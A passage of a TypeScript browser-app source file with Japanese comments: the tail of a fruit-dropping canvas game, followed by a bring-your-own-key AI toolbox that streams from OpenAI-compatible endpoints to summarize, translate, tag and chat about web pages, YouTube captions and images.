          score += FRUITS[newType].pt;
          setScore(score);
          i = -1;
          break;
        }
      }
    }
    // ゲームオーバー判定 (天井超え + 1秒以上)
    const now = performance.now();
    for (const b of balls) {
      const r = FRUITS[b.type].r;
      if (b.y - r < ceilingY && now - b.spawnAt > 1500) {
        over = true;
      }
    }
  };

  const draw = (): void => {
    ctx.fillStyle = "#fff7e6";
    ctx.fillRect(0, 0, W, H);
    // 天井ライン
    ctx.strokeStyle = "#e44";
    ctx.setLineDash([6, 4]);
    ctx.beginPath();
    ctx.moveTo(0, ceilingY);
    ctx.lineTo(W, ceilingY);
    ctx.stroke();
    ctx.setLineDash([]);
    // 次のフルーツプレビュー
    if (!over) {
      const nf = FRUITS[nextType];
      ctx.globalAlpha = 0.4;
      ctx.fillStyle = nf.color;
      ctx.beginPath();
      ctx.arc(
        Math.max(nf.r + 2, Math.min(W - nf.r - 2, pointerX)),
        ceilingY - nf.r - 2,
        nf.r,
        0,
        Math.PI * 2,
      );
      ctx.fill();
      ctx.globalAlpha = 1;
    }
    // ボール
    for (const b of balls) {
      const f = FRUITS[b.type];
      ctx.fillStyle = f.color;
      ctx.beginPath();
      ctx.arc(b.x, b.y, f.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.strokeStyle = "rgba(0,0,0,0.25)";
      ctx.stroke();
      ctx.fillStyle = "#000";
      ctx.font = `${Math.floor(f.r * 1.1)}px sans-serif`;
      ctx.textAlign = "center";
      ctx.textBaseline = "middle";
      ctx.fillText(f.label, b.x, b.y);
    }
    ctx.textAlign = "start";
    ctx.textBaseline = "alphabetic";
    // HUD
    ctx.fillStyle = "#333";
    ctx.font = "14px sans-serif";
    ctx.fillText(`Score: ${score}`, 8, 18);
    ctx.fillText("クリックで落下", 8, 36);

    if (over) {
      ctx.fillStyle = "rgba(0,0,0,0.55)";
      ctx.fillRect(0, 0, W, H);
      ctx.fillStyle = "#fff";
      ctx.font = "26px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", W / 2, H / 2 - 6);
      ctx.font = "14px sans-serif";
      ctx.fillText(`スコア ${score}`, W / 2, H / 2 + 18);
      ctx.textAlign = "start";
    }
  };

  let raf = 0;
  const loop = (): void => {
    if (!over) step();
    draw();
    raf = requestAnimationFrame(loop);
  };
  raf = requestAnimationFrame(loop);

  return () => {
    cancelAnimationFrame(raf);
    canvas.removeEventListener("mousemove", onMove);
    canvas.removeEventListener("click", onClick);
  };
}

// ===== ✨ AI アシスタント (BYOK) =====

interface AISettings {
  base: string;
  model: string;
  key: string;
}

const AI_PRESETS: Record<string, { base: string; model: string }> = {
  openai: { base: "https://api.openai.com/v1", model: "gpt-4o-mini" },
  groq: {
    base: "https://api.groq.com/openai/v1",
    model: "llama-3.3-70b-versatile",
  },
  openrouter: {
    base: "https://openrouter.ai/api/v1",
    model: "openai/gpt-4o-mini",
  },
  ollama: { base: "http://localhost:11434/v1", model: "llama3.2" },
  custom: { base: "", model: "" },
};

const AI_STORAGE_KEY = "yuzu-ai-settings-v1";

function loadAISettings(): AISettings {
  try {
    const raw = localStorage.getItem(AI_STORAGE_KEY);
    if (raw) {
      const j = JSON.parse(raw) as Partial<AISettings>;
      return {
        base: j.base ?? AI_PRESETS.openai.base,
        model: j.model ?? AI_PRESETS.openai.model,
        key: j.key ?? "",
      };
    }
  } catch {
    /* noop */
  }
  return {
    base: AI_PRESETS.openai.base,
    model: AI_PRESETS.openai.model,
    key: "",
  };
}

function saveAISettings(s: AISettings): void {
  try {
    localStorage.setItem(AI_STORAGE_KEY, JSON.stringify(s));
  } catch {
    /* noop */
  }
}

/** HTML から本文テキストを抽出 (script/style/nav/footer を除去) */
function extractMainText(html: string): { title: string; text: string } {
  let title = "";
  let text = "";
  try {
    const doc = new DOMParser().parseFromString(html, "text/html");
    title = doc.title || "";
    // 不要要素を削除
    doc
      .querySelectorAll(
        "script, style, noscript, iframe, svg, nav, footer, header, aside, form, .ad, .ads, .advertisement",
      )
      .forEach((el) => el.remove());
    const main =
      doc.querySelector("article") ||
      doc.querySelector("main") ||
      doc.querySelector("[role=main]") ||
      doc.body;
    text = (main?.textContent ?? "").replace(/\s+/g, " ").trim();
  } catch {
    text = html
      .replace(/<[^>]+>/g, " ")
      .replace(/\s+/g, " ")
      .trim();
  }
  return { title, text };
}

interface AIChatMessage {
  role: "system" | "user" | "assistant";
  content: string | AIContentPart[];
}
interface AIContentPart {
  type: "text" | "image_url";
  text?: string;
  image_url?: { url: string };
}

async function callOpenAICompatible(
  settings: AISettings,
  messages: AIChatMessage[],
  signal: AbortSignal,
  onDelta?: (chunk: string) => void,
): Promise<string> {
  const base = settings.base.replace(/\/+$/, "");
  const url = `${base}/chat/completions`;
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
  };
  if (settings.key) headers["Authorization"] = `Bearer ${settings.key}`;
  const stream = !!onDelta;
  const res = await fetch(url, {
    method: "POST",
    headers,
    body: JSON.stringify({
      model: settings.model,
      messages,
      temperature: 0.4,
      stream,
    }),
    signal,
  });
  if (!res.ok) {
    let detail = "";
    try {
      detail = await res.text();
    } catch {
      /* noop */
    }
    throw new Error(`HTTP ${res.status}: ${detail.slice(0, 500)}`);
  }
  if (!stream) {
    const j = (await res.json()) as {
      choices?: { message?: { content?: string } }[];
      error?: { message?: string };
    };
    if (j.error?.message) throw new Error(j.error.message);
    const content = j.choices?.[0]?.message?.content;
    if (typeof content !== "string") {
      throw new Error("APIレスポンスにメッセージがありません");
    }
    return content;
  }
  // SSE ストリーミング解析
  if (!res.body) throw new Error("ストリーミング応答が空です");
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  let acc = "";
  while (true) {
    const { value, done } = await reader.read();
    if (done) break;
    buf += decoder.decode(value, { stream: true });
    let nl: number;
    while ((nl = buf.indexOf("\n")) >= 0) {
      const line = buf.slice(0, nl).trim();
      buf = buf.slice(nl + 1);
      if (!line || !line.startsWith("data:")) continue;
      const data = line.slice(5).trim();
      if (data === "[DONE]") return acc;
      try {
        const j = JSON.parse(data) as {
          choices?: { delta?: { content?: string } }[];
          error?: { message?: string };
        };
        if (j.error?.message) throw new Error(j.error.message);
        const piece = j.choices?.[0]?.delta?.content;
        if (typeof piece === "string" && piece.length > 0) {
          acc += piece;
          onDelta!(piece);
        }
      } catch (e) {
        // パース失敗は無視 (一部プロバイダのコメント行)
        if (e instanceof Error && e.message.includes("[")) throw e;
      }
    }
  }
  return acc;
}

let aiPageCache: { url: string; title: string; text: string } | null = null;
let aiAbort: AbortController | null = null;

function setupAITool(): void {
  const presetSel = $id<HTMLSelectElement>("ai-preset");
  const presetApply = $id<HTMLButtonElement>("ai-preset-apply");
  const baseEl = $id<HTMLInputElement>("ai-base");
  const modelEl = $id<HTMLInputElement>("ai-model");
  const keyEl = $id<HTMLInputElement>("ai-key");
  const keyToggle = $id<HTMLButtonElement>("ai-key-toggle");
  const saveBtn = $id<HTMLButtonElement>("ai-save");
  const sumBtn = $id<HTMLButtonElement>("ai-summarize");
  const trBtn = $id<HTMLButtonElement>("ai-translate");
  const tagBtn = $id<HTMLButtonElement>("ai-tags");
  const buzzBtn = $id<HTMLButtonElement>("ai-buzz");
  const tldrBtn = $id<HTMLButtonElement>("ai-tldr");
  const cancelBtn = $id<HTMLButtonElement>("ai-cancel");
  const askBtn = $id<HTMLButtonElement>("ai-ask");
  const questionEl = $id<HTMLInputElement>("ai-question");
  const incUrl = $id<HTMLInputElement>("ai-include-url");
  const fetchFresh = $id<HTMLInputElement>("ai-fetch-fresh");
  const maxCharsEl = $id<HTMLInputElement>("ai-maxchars");
  const out = $id<HTMLTextAreaElement>("ai-output");
  const statusEl = $id<HTMLSpanElement>("ai-status");
  const copyBtn = $id<HTMLButtonElement>("ai-copy");
  const dlBtn = $id<HTMLButtonElement>("ai-download");
  const clearBtn = $id<HTMLButtonElement>("ai-clear");
  if (!baseEl || !modelEl || !keyEl || !out) return;

  // 初期値ロード
  const init = loadAISettings();
  baseEl.value = init.base;
  modelEl.value = init.model;
  keyEl.value = init.key;

  presetApply?.addEventListener("click", () => {
    const k = presetSel?.value ?? "openai";
    const p = AI_PRESETS[k];
    if (!p) return;
    if (k !== "custom") {
      baseEl.value = p.base;
      modelEl.value = p.model;
    }
  });
  keyToggle?.addEventListener("click", () => {
    if (keyEl.type === "password") {
      keyEl.type = "text";
      keyToggle.textContent = "隠す";
    } else {
      keyEl.type = "password";
      keyToggle.textContent = "表示";
    }
  });
  saveBtn?.addEventListener("click", () => {
    saveAISettings({
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    });
    if (statusEl) statusEl.textContent = "設定を保存しました";
  });
  // 入力時にも自動保存 (キーは blur 時のみ)
  baseEl.addEventListener("change", () =>
    saveAISettings({
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    }),
  );
  modelEl.addEventListener("change", () =>
    saveAISettings({
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    }),
  );

  const setBusy = (busy: boolean): void => {
    [sumBtn, trBtn, tagBtn, buzzBtn, tldrBtn, askBtn].forEach((b) => {
      if (b) b.disabled = busy;
    });
    if (cancelBtn) cancelBtn.disabled = !busy;
  };

  cancelBtn?.addEventListener("click", () => {
    aiAbort?.abort();
    aiAbort = null;
    setBusy(false);
    if (statusEl) statusEl.textContent = "停止しました";
  });

  copyBtn?.addEventListener("click", async () => {
    if (!out.value) return;
    try {
      await navigator.clipboard.writeText(out.value);
      if (statusEl) statusEl.textContent = "コピーしました";
    } catch {
      if (statusEl) statusEl.textContent = "コピー失敗";
    }
  });
  dlBtn?.addEventListener("click", () => {
    if (!out.value) return;
    const blob = new Blob([out.value], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    const stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
    a.href = url;
    a.download = `yuzu-ai-${stamp}.md`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });
  clearBtn?.addEventListener("click", () => {
    out.value = "";
    aiPageCache = null;
    if (statusEl) statusEl.textContent = "クリアしました";
  });

  /** 現在タブの本文を取得 (キャッシュあり) */
  const ensurePage = async (): Promise<{
    url: string;
    title: string;
    text: string;
  }> => {
    const a = activeTab();
    if (!a) throw new Error("アクティブなタブがありません");
    if (
      !fetchFresh?.checked &&
      aiPageCache &&
      aiPageCache.url === a.url &&
      aiPageCache.text
    ) {
      return aiPageCache;
    }
    if (!/^https?:\/\//i.test(a.url)) {
      throw new Error("http(s) のページのみ対応しています");
    }
    if (statusEl) statusEl.textContent = "ページを取得中…";
    const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
      url: a.url,
      userAgent: null,
    });
    const { title, text } = extractMainText(r.body);
    const cache = { url: a.url, title: title || a.title || a.url, text };
    aiPageCache = cache;
    return cache;
  };

  const truncate = (s: string): string => {
    const max = Math.max(
      500,
      Math.min(200000, Number(maxCharsEl?.value) || 20000),
    );
    return s.length > max ? s.slice(0, max) + "\n\n[…以下省略]" : s;
  };

  const buildContext = (page: {
    url: string;
    title: string;
    text: string;
  }): string => {
    const parts: string[] = [];
    parts.push(`# タイトル\n${page.title}`);
    if (incUrl?.checked) parts.push(`# URL\n${page.url}`);
    parts.push(`# 本文\n${truncate(page.text)}`);
    return parts.join("\n\n");
  };

  const run = async (
    actionLabel: string,
    systemPrompt: string,
    userTemplate: (ctx: string) => string,
  ): Promise<void> => {
    const settings: AISettings = {
      base: baseEl.value.trim(),
      model: modelEl.value.trim(),
      key: keyEl.value,
    };
    if (!settings.base || !settings.model) {
      if (statusEl)
        statusEl.textContent = "Base URL とモデルを設定してください";
      return;
    }
    saveAISettings(settings);
    setBusy(true);
    aiAbort = new AbortController();
    try {
      const page = await ensurePage();
      const ctx = buildContext(page);
      if (statusEl)
        statusEl.textContent = `${actionLabel}中… (${page.text.length} chars)`;
      const streamEl = $id<HTMLInputElement>("ai-stream");
      const useStream = streamEl?.checked !== false;
      out.value = "";
      const onDelta = useStream
        ? (chunk: string): void => {
            out.value += chunk;
            out.scrollTop = out.scrollHeight;
          }
        : undefined;
      const result = await callOpenAICompatible(
        settings,
        [
          { role: "system", content: systemPrompt },
          { role: "user", content: userTemplate(ctx) },
        ],
        aiAbort.signal,
        onDelta,
      );
      if (!useStream) out.value = result.trim();
      if (statusEl) statusEl.textContent = `${actionLabel} 完了`;
    } catch (e) {
      if ((e as Error).name === "AbortError") return;
      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
    } finally {
      setBusy(false);
      aiAbort = null;
    }
  };

  sumBtn?.addEventListener("click", () => {
    void run(
      "要約",
      "あなたは優秀な技術ライターです。Web ページの内容を読みやすい日本語の Markdown で要約してください。",
      (ctx) =>
        `次の Web ページを Markdown で要約してください。\n\n要件:\n- 冒頭に 2〜3 行の概要\n- ## 要点 セクションに箇条書きで 5〜8 個\n- ## 詳細 セクションに段落で深掘り\n- 末尾に ## キーワード として 5 個程度のタグ\n- 出力は Markdown のみ。前置きは不要。\n\n${ctx}`,
    );
  });
  tldrBtn?.addEventListener("click", () => {
    void run(
      "TL;DR",
      "あなたは要点抽出のプロです。回答は厳密に 3 行、絵文字なし、日本語。",
      (ctx) =>
        `次のページを 3 行で要約してください。各行は 60 文字以内。出力は箇条書き 3 行のみ。\n\n${ctx}`,
    );
  });
  trBtn?.addEventListener("click", () => {
    void run(
      "翻訳",
      "あなたは正確な翻訳者です。ページ本文を自然な日本語に翻訳して Markdown で返してください。",
      (ctx) =>
        `次の Web ページの本文を、見出し構造を保ったまま自然な日本語の Markdown に翻訳してください。固有名詞や URL はそのまま。前置き不要。\n\n${ctx}`,
    );
  });
  tagBtn?.addEventListener("click", () => {
    void run(
      "タグ抽出",
      "あなたは SEO/SNS マーケターです。日本語で簡潔に。",
      (ctx) =>
        `次のページから以下を Markdown で出力してください:\n\n## 主要キーワード\n- (10 個)\n\n## SEO 用ロングテール\n- (5 個)\n\n## SNS ハッシュタグ\n#tag1 #tag2 ... (10 個、半角 #、スペース区切り)\n\n${ctx}`,
    );
  });
  buzzBtn?.addEventListener("click", () => {
    void run(
      "SNS 文生成",
      "あなたは X (旧 Twitter) のバズ投稿を量産する SNS の達人です。釣りすぎず、要点を引き、続きが気になる書き方をします。",
      (ctx) =>
        `次のページを紹介するための SNS 投稿案を Markdown で 5 案出してください。\n\n各案:\n- 140 文字以内 (URL 含めず)\n- フック→要点→CTA の構成\n- 末尾に 2〜4 個のハッシュタグ\n- 1案ごとに見出し ### 案N (狙い: ...) を付け、本文をコードブロックで囲む\n\n${ctx}`,
    );
  });
  askBtn?.addEventListener("click", () => {
    const q = (questionEl?.value ?? "").trim();
    if (!q) {
      if (statusEl) statusEl.textContent = "質問を入力してください";
      return;
    }
    void run(
      "回答",
      "あなたは Web ページの内容に基づいて質問に答えるアシスタントです。ページに書かれていない事は推測せず、根拠が無ければそう述べてください。回答は日本語の Markdown。",
      (ctx) => `# 質問\n${q}\n\n# 参照ページ\n${ctx}`,
    );
  });
  questionEl?.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !e.isComposing) {
      e.preventDefault();
      askBtn?.click();
    }
  });

  setupAIExtras();
}

// ===== AI 拡張機能 =====

function getAISettingsOrAlert(
  statusFn?: (s: string) => void,
): AISettings | null {
  const s = loadAISettings();
  // 入力欄優先
  const baseEl = document.getElementById("ai-base") as HTMLInputElement | null;
  const modelEl = document.getElementById(
    "ai-model",
  ) as HTMLInputElement | null;
  const keyEl = document.getElementById("ai-key") as HTMLInputElement | null;
  const merged: AISettings = {
    base: (baseEl?.value || s.base).trim(),
    model: (modelEl?.value || s.model).trim(),
    key: keyEl?.value || s.key,
  };
  if (!merged.base || !merged.model) {
    statusFn?.("AI 設定 (Base URL / モデル) を入力してください");
    return null;
  }
  return merged;
}

async function aiEnsurePage(): Promise<{
  url: string;
  title: string;
  text: string;
}> {
  const a = activeTab();
  if (!a) throw new Error("アクティブなタブがありません");
  if (aiPageCache && aiPageCache.url === a.url && aiPageCache.text) {
    return aiPageCache;
  }
  if (!/^https?:\/\//i.test(a.url)) {
    throw new Error("http(s) のページのみ対応");
  }
  const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
    url: a.url,
    userAgent: null,
  });
  const { title, text } = extractMainText(r.body);
  const cache = { url: a.url, title: title || a.title || a.url, text };
  aiPageCache = cache;
  return cache;
}

/** AI ツールセクションを開いて指定 ID にフォーカス */
function aiOpenTool(focusId?: string): void {
  void openToolboxPanel().then(() => {
    document
      .querySelectorAll<HTMLButtonElement>("#toolbox-nav .toolbox-nav-item")
      .forEach((b) => {
        b.classList.toggle("active", b.dataset.tool === "ai");
      });
    document
      .querySelectorAll<HTMLElement>("#toolbox-content .toolbox-tool")
      .forEach((s) => {
        s.hidden = s.dataset.tool !== "ai";
      });
    if (focusId) {
      const el = document.getElementById(focusId);
      if (el && "focus" in el) (el as HTMLElement).focus();
    }
  });
}

/** アドレスバーから "AI:..." で呼ばれた時の処理: AI ツールを開いて質問を流す */
async function runAIFromAddressBar(question: string): Promise<void> {
  aiOpenTool("ai-question");
  const qEl = document.getElementById("ai-question") as HTMLInputElement | null;
  if (qEl) qEl.value = question;
  // 質問ボタンクリック
  const askBtn = document.getElementById("ai-ask") as HTMLButtonElement | null;
  setTimeout(() => askBtn?.click(), 100);
}

/** ストリーミング対応の汎用呼び出し (出力先 textarea を渡す) */
async function aiInvoke(
  out: HTMLTextAreaElement,
  systemPrompt: string,
  user: string | AIChatMessage[],
  statusFn?: (s: string) => void,
  forceModel?: string,
): Promise<string> {
  const settings = getAISettingsOrAlert(statusFn);
  if (!settings) return "";
  if (forceModel) settings.model = forceModel;
  aiAbort?.abort();
  aiAbort = new AbortController();
  const streamEl = document.getElementById(
    "ai-stream",
  ) as HTMLInputElement | null;
  const useStream = streamEl?.checked !== false;
  out.value = "";
  const messages: AIChatMessage[] = Array.isArray(user)
    ? [{ role: "system", content: systemPrompt }, ...user]
    : [
        { role: "system", content: systemPrompt },
        { role: "user", content: user },
      ];
  try {
    const result = await callOpenAICompatible(
      settings,
      messages,
      aiAbort.signal,
      useStream
        ? (chunk) => {
            out.value += chunk;
            out.scrollTop = out.scrollHeight;
          }
        : undefined,
    );
    if (!useStream) out.value = result.trim();
    statusFn?.("完了");
    return out.value;
  } catch (e) {
    if ((e as Error).name === "AbortError") return "";
    statusFn?.(`エラー: ${String(e)}`);
    return "";
  } finally {
    aiAbort = null;
  }
}

function setupAIExtras(): void {
  setupAIChat();
  setupAITextOps();
  setupAIMedia();
  setupAIMultiTranslate();
  setupAIAnki();
  setupAIBookmarkTag();
}

// --- 💬 チャット ---

interface ChatTurn {
  role: "user" | "assistant";
  content: string;
}
const aiChatHistory: ChatTurn[] = [];
let aiChatPageUrl: string | null = null;

function renderChatLog(): void {
  const log = document.getElementById("ai-chat-log");
  if (!log) return;
  log.innerHTML = "";
  for (const t of aiChatHistory) {
    const row = document.createElement("div");
    row.style.marginBottom = "8px";
    const who = document.createElement("strong");
    who.textContent = t.role === "user" ? "🧑 You: " : "🤖 AI: ";
    who.style.color = t.role === "user" ? "#4a9" : "#a94";
    row.appendChild(who);
    const txt = document.createElement("span");
    txt.textContent = t.content;
    row.appendChild(txt);
    log.appendChild(row);
  }
  log.scrollTop = log.scrollHeight;
}

function setupAIChat(): void {
  const input = document.getElementById(
    "ai-chat-input",
  ) as HTMLInputElement | null;
  const sendBtn = document.getElementById(
    "ai-chat-send",
  ) as HTMLButtonElement | null;
  const clearBtn = document.getElementById(
    "ai-chat-clear",
  ) as HTMLButtonElement | null;
  const log = document.getElementById("ai-chat-log") as HTMLDivElement | null;
  if (!input || !sendBtn || !log) return;

  clearBtn?.addEventListener("click", () => {
    aiChatHistory.length = 0;
    aiChatPageUrl = null;
    renderChatLog();
  });

  const send = async (): Promise<void> => {
    const q = input.value.trim();
    if (!q) return;
    input.value = "";
    sendBtn.disabled = true;
    try {
      const page = await aiEnsurePage();
      // ページ変更で履歴リセット (推奨)
      if (aiChatPageUrl && aiChatPageUrl !== page.url) {
        aiChatHistory.length = 0;
      }
      aiChatPageUrl = page.url;
      aiChatHistory.push({ role: "user", content: q });
      renderChatLog();

      const settings = getAISettingsOrAlert((s) => {
        log.innerHTML = `<em>${s}</em>`;
      });
      if (!settings) return;

      // システムは初回だけページコンテキストを含めた長文、以降は履歴ベース
      const sys = `あなたは親切な日本語アシスタントです。以下の Web ページを読んだ上で、ユーザーと連続して会話してください。ページに無い事は推測せず、根拠が無ければそう述べる。\n\n# ページタイトル\n${page.title}\n# URL\n${page.url}\n# 本文 (一部抜粋)\n${page.text.slice(0, 16000)}`;
      const messages: AIChatMessage[] = [
        { role: "system", content: sys },
        ...aiChatHistory.map<AIChatMessage>((t) => ({
          role: t.role,
          content: t.content,
        })),
      ];

      // ストリーミング表示用に仮のアシスタントターンを追加
      aiChatHistory.push({ role: "assistant", content: "" });
      renderChatLog();
      const lastIdx = aiChatHistory.length - 1;

      aiAbort?.abort();
      aiAbort = new AbortController();
      const streamEl = document.getElementById(
        "ai-stream",
      ) as HTMLInputElement | null;
      const useStream = streamEl?.checked !== false;
      try {
        const result = await callOpenAICompatible(
          settings,
          messages,
          aiAbort.signal,
          useStream
            ? (chunk) => {
                aiChatHistory[lastIdx].content += chunk;
                renderChatLog();
              }
            : undefined,
        );
        if (!useStream) {
          aiChatHistory[lastIdx].content = result.trim();
          renderChatLog();
        }
      } catch (e) {
        if ((e as Error).name !== "AbortError") {
          aiChatHistory[lastIdx].content = `[エラー] ${String(e)}`;
          renderChatLog();
        }
      } finally {
        aiAbort = null;
      }
    } catch (e) {
      log.innerHTML = `<em>エラー: ${String(e)}</em>`;
    } finally {
      sendBtn.disabled = false;
    }
  };

  sendBtn.addEventListener("click", () => void send());
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !e.isComposing) {
      e.preventDefault();
      void send();
    }
  });
}

// --- 📋 テキスト操作 ---

function setupAITextOps(): void {
  const ta = document.getElementById(
    "ai-text-input",
  ) as HTMLTextAreaElement | null;
  const out = document.getElementById(
    "ai-output",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!ta || !out) return;

  document
    .getElementById("ai-text-paste")
    ?.addEventListener("click", async () => {
      try {
        const t = await navigator.clipboard.readText();
        ta.value = t;
        status(`貼り付け ${t.length} 文字`);
      } catch {
        status("クリップボードを読めません");
      }
    });
  document.getElementById("ai-text-clear")?.addEventListener("click", () => {
    ta.value = "";
  });

  const requireText = (): string | null => {
    const t = ta.value.trim();
    if (!t) {
      status("テキストを入力してください");
      return null;
    }
    return t;
  };

  document
    .getElementById("ai-text-translate")
    ?.addEventListener("click", () => {
      const t = requireText();
      if (!t) return;
      void aiInvoke(
        out,
        "あなたは正確で自然な翻訳者です。原文の言語を自動判定して日本語に翻訳。前置き不要。",
        `次のテキストを日本語に翻訳してください:\n\n${t}`,
        status,
      );
    });
  document.getElementById("ai-text-explain")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    void aiInvoke(
      out,
      "あなたは分かりやすい日本語の解説者です。中学生にも分かるように。",
      `次のテキストを日本語で噛み砕いて解説してください。専門用語は (補足) で簡潔に説明。\n\n${t}`,
      status,
    );
  });
  document.getElementById("ai-text-rewrite")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    void aiInvoke(
      out,
      "あなたは文章校正の専門家です。意味を変えずに自然で読みやすい日本語にします。",
      `次の文章を、意味を変えずに自然な日本語に書き直してください。誤字脱字も修正。出力は本文のみ。\n\n${t}`,
      status,
    );
  });
  document.getElementById("ai-text-code")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    const lang =
      (
        document.getElementById("ai-code-lang") as HTMLInputElement | null
      )?.value.trim() || "auto";
    void aiInvoke(
      out,
      "あなたは熟練のソフトウェアエンジニアです。コードを正確に日本語で説明します。",
      `次のコード (言語: ${lang}) を Markdown で説明してください。\n\n# 出力フォーマット\n## 概要\n## 行ごとの解説 (重要箇所のみ)\n## 注意点 / バグ可能性\n## より良い書き方の提案 (あれば)\n\n\`\`\`${lang === "auto" ? "" : lang}\n${t}\n\`\`\``,
      status,
    );
  });
  document.getElementById("ai-text-json")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    void aiInvoke(
      out,
      "あなたは API/データ構造の解説者です。",
      `次の JSON/データ構造を日本語で説明してください。\n\n# 出力\n## 概要\n## フィールド一覧 (Markdown 表: 名前 | 型 | 意味)\n## サンプル用途\n\n\`\`\`json\n${t}\n\`\`\``,
      status,
    );
  });
  document.getElementById("ai-text-mail")?.addEventListener("click", () => {
    const t = requireText();
    if (!t) return;
    const tone =
      (document.getElementById("ai-mail-tone") as HTMLSelectElement | null)
        ?.value || "ビジネス丁寧";
    void aiInvoke(
      out,
      "あなたは日本語ビジネスメールのプロです。簡潔・敬意・要点を明確に。",
      `次の受信メールに対する返信案を「${tone}」のトーンで 2 案作ってください。\n\n# 出力\n## 案1\n件名: ...\n本文:\n...\n\n## 案2\n件名: ...\n本文:\n...\n\n# 受信メール\n${t}`,
      status,
    );
  });
}

// --- 🎬 メディア (YouTube / 画像 Vision / ファイル) ---

async function fetchYoutubeTranscript(videoUrl: string): Promise<string> {
  const m =
    videoUrl.match(/[?&]v=([\w-]{11})/) ||
    videoUrl.match(/youtu\.be\/([\w-]{11})/);
  if (!m) throw new Error("YouTube 動画 URL ではありません");
  const id = m[1];
  // ページ HTML から captionTracks を取り出す
  const watch = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
    url: `https://www.youtube.com/watch?v=${id}`,
    userAgent: null,
  });
  const html = watch.body;
  const tracksMatch = html.match(/"captionTracks":(\[.*?\])/);
  if (!tracksMatch) throw new Error("字幕トラックが見つかりません");
  let tracks: { baseUrl: string; languageCode?: string; vssId?: string }[] = [];
  try {
    tracks = JSON.parse(tracksMatch[1].replace(/\\u0026/g, "&"));
  } catch {
    throw new Error("字幕トラックの解析に失敗");
  }
  if (tracks.length === 0) throw new Error("字幕がありません");
  // ja → en → 先頭 の優先で選ぶ
  const pick =
    tracks.find((t) => t.languageCode === "ja") ||
    tracks.find((t) => t.languageCode === "en") ||
    tracks[0];
  const url = pick.baseUrl.replace(/&fmt=\w+/, "") + "&fmt=vtt";
  const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
    url,
    userAgent: null,
  });
  // VTT → プレーンテキスト
  const lines: string[] = [];
  for (const line of r.body.split(/\r?\n/)) {
    const t = line.trim();
    if (!t) continue;
    if (/^WEBVTT/.test(t)) continue;
    if (/^\d+$/.test(t)) continue;
    if (/-->/.test(t)) continue;
    if (/^NOTE\b/.test(t)) continue;
    if (/^STYLE/.test(t)) continue;
    lines.push(t.replace(/<[^>]+>/g, ""));
  }
  return lines.join(" ").replace(/\s+/g, " ").trim();
}

async function fileToDataUrl(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const fr = new FileReader();
    fr.onload = () => resolve(String(fr.result));
    fr.onerror = () => reject(fr.error);
    fr.readAsDataURL(file);
  });
}

async function fileToText(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const fr = new FileReader();
    fr.onload = () => resolve(String(fr.result));
    fr.onerror = () => reject(fr.error);
    fr.readAsText(file);
  });
}

function setupAIMedia(): void {
  const out = document.getElementById(
    "ai-output",
  ) as HTMLTextAreaElement | null;
  const statusEl = document.getElementById(
    "ai-status",
  ) as HTMLSpanElement | null;
  const status = (s: string): void => {
    if (statusEl) statusEl.textContent = s;
  };
  if (!out) return;

  document
    .getElementById("ai-yt-summarize")
    ?.addEventListener("click", async () => {
      const a = activeTab();
      if (!a) {
        status("アクティブなタブがありません");
        return;
      }
      status("YouTube 字幕取得中…");
      try {
        const transcript = await fetchYoutubeTranscript(a.url);
        const max = 30000;
        const text =
          transcript.length > max
            ? transcript.slice(0, max) + " […省略]"
            : transcript;
        void aiInvoke(
          out,
          "あなたは動画内容の要約者です。冗長な相槌は省き、要点を構造化して日本語 Markdown で返します。",
          `以下は YouTube 動画の字幕全文です。日本語で要約してください。\n\n# 出力\n## 一言でいうと\n## 章立て要約 (5〜10 個、見出し+1〜2 行)\n## 重要キーワード\n## 結論 / 学び\n\n# 字幕\n${text}`,
          status,
        );
      } catch (e) {
        status(`エラー: ${String(e)}`);
      }
    });

  const imgFile = document.getElementById(
    "ai-image-file",
  ) as HTMLInputElement | null;

  const runVision = async (
    prompt: string,
    sysPrompt: string,
  ): Promise<void> => {
    const f = imgFile?.files?.[0];
    if (!f) {
      status("画像を選択してください");
      return;
    }
    status("画像を送信中…");
    try {
      const dataUrl = await fileToDataUrl(f);
      void aiInvoke(
        out,
        sysPrompt,
        [
          {
            role: "user",
            content: [
              { type: "text", text: prompt },
              { type: "image_url", image_url: { url: dataUrl } },
            ],
          },
        ],
        status,
      );
    } catch (e) {
      status(`エラー: ${String(e)}`);
    }
  };

  document.getElementById("ai-image-ocr")?.addEventListener("click", () => {
    void runVision(
      "この画像に写っている全てのテキストを正確に書き起こしてください。レイアウトは保ちつつ、純粋なテキストのみを返してください。前置き不要。",
      "あなたは高精度 OCR エンジンです。",
    );
  });
  document
    .getElementById("ai-image-describe")
    ?.addEventListener("click", () => {
      void runVision(
        "この画像の内容を日本語で詳細に説明してください。被写体・構図・推測される文脈・読み取れるテキストの順で。",
        "あなたは画像の説明者です。日本語で。",
      );
    });

  const fileEl = document.getElementById(
    "ai-file-input",
  ) as HTMLInputElement | null;
  document
    .getElementById("ai-file-summarize")
